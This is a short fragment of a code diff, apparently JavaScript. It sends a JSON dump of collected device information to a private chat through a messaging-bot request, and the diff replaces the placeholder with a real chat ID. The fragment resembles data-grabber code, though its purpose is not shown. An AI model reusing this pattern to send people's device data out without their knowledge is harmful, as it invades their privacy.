@@ -25,7 +25,7 @@
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                chat_id: "CHAT_ID", // ضع هنا معرف المستخدم
+                chat_id: "1016154097", // ضع هنا معرف المستخدم
                 text: `📱 معلومات الجهاز:\n${JSON.stringify(deviceInfo, null, 2)}`
             })
         })
